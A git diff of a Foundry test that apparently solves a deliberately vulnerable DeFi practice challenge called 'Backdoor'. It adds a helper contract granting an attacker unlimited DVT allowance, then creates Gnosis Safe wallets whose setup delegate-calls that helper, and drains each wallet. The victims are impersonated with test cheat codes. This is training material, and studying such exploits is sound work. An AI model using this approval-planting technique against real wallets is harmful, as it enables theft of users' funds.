@@ -8,6 +8,14 @@ import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {WalletRegistry} from "../../../src/Contracts/backdoor/WalletRegistry.sol";
 import {GnosisSafe} from "gnosis/GnosisSafe.sol";
 import {GnosisSafeProxyFactory} from "gnosis/proxies/GnosisSafeProxyFactory.sol";
+import {GnosisSafeProxy} from "gnosis/proxies/GnosisSafeProxy.sol";
+import {Enum} from "gnosis/common/Enum.sol";
+
+contract MaliousApprove {
+    function maliousApprove(address attacker, DamnValuableToken token) public {
+        token.approve(attacker, type(uint256).max);
+    }
+}
 
 contract Backdoor is Test {
     uint256 internal constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;
@@ -29,7 +37,6 @@ contract Backdoor is Test {
         /**
          * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
          */
-
         utils = new Utilities();
         users = utils.createUsers(NUM_USERS);
 
@@ -57,12 +64,7 @@ contract Backdoor is Test {
         vm.label(address(dvt), "DVT");
 
         // Deploy the registry
-        walletRegistry = new WalletRegistry(
-            address(masterCopy),
-            address(walletFactory),
-            address(dvt),
-            users
-        );
+        walletRegistry = new WalletRegistry(address(masterCopy), address(walletFactory), address(dvt), users);
 
         // Users are registered as beneficiaries
         for (uint256 i = 0; i < NUM_USERS; i++) {
@@ -75,10 +77,38 @@ contract Backdoor is Test {
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
-    function testExploit() public {
+    function testExploitBackdoor() public {
         /**
          * EXPLOIT START *
          */
+        MaliousApprove mApprove = new MaliousApprove();
+
+        //create wallets for users
+        for (uint256 i = 0; i < NUM_USERS; i++) {
+            vm.startPrank(users[i], users[i]);
+
+            bytes memory approvedata = abi.encodeCall(MaliousApprove.maliousApprove, (attacker, dvt));
+
+            //do
+            address[] memory adds = new address[](1);
+            adds[0] = users[i];
+            bytes memory data = abi.encodeWithSignature(
+                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
+                adds,
+                1,
+                address(mApprove),
+                approvedata,
+                address(0),
+                address(0),
+                0,
+                address(0)
+            );
+            GnosisSafeProxy proxy = walletFactory.createProxyWithCallback(address(masterCopy), data, i, walletRegistry);
+            vm.stopPrank();
+
+            vm.prank(attacker);
+            dvt.transferFrom(address(proxy), attacker, 10e18);
+        }
 
         /**
          * EXPLOIT END *
